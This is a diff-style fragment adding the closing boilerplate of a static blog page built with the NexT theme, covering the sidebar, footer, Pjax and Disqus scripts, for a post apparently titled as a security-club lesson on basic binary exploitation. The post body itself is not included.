+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-password"><span class="nav-number">1.</span> <span class="nav-text">0x01: password</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yctseng"
+      src="/images/yctseng.png">
+  <p class="site-author-name" itemprop="name">yctseng</p>
+  <div class="site-description" itemprop="description">競程廢物、資安菜鳥 >_<</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yctseng1227" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yctseng1227" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/yctseng1227/" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;yctseng1227&#x2F;" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.instagram.com/yctseng1227/" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yctseng1227&#x2F;" rel="noopener" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://codeforces.com/profile/yctseng/" title="Codeforces → http:&#x2F;&#x2F;codeforces.com&#x2F;profile&#x2F;yctseng&#x2F;" rel="noopener" target="_blank"><i class="fas fa-poll fa-fw"></i>Codeforces</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ctftime.org/user/65888" title="CTFtime → https:&#x2F;&#x2F;ctftime.org&#x2F;user&#x2F;65888" rel="noopener" target="_blank"><i class="fas fa-flag-checkered fa-fw"></i>CTFtime</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/MacacaHub-107811803945876/" title="MacacaHub → https:&#x2F;&#x2F;www.facebook.com&#x2F;MacacaHub-107811803945876&#x2F;" rel="noopener" target="_blank"><i class="fas fa-chess-queen fa-fw"></i>MacacaHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友站Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.tinytsunami.info/" title="https:&#x2F;&#x2F;www.tinytsunami.info" rel="noopener" target="_blank">羊羽手札</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.laiyelling.com/" title="https:&#x2F;&#x2F;www.laiyelling.com" rel="noopener" target="_blank">LaiYelling 的地下室</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-bong"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yctseng</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="總字數">76k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="所需總閱讀時間">2:19</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="訪客總數">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="總瀏覽次數">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-pjax@0/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+  
+
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://yctseng1227.github.io/2020/03/22/200320-nsysuisc-pwn-1/";
+    this.page.identifier = "2020/03/22/200320-nsysuisc-pwn-1/";
+    this.page.title = "資安社課 Pwn basic(1)";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://yctseng1227-blog.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+    </div>
+</body>
+</html>
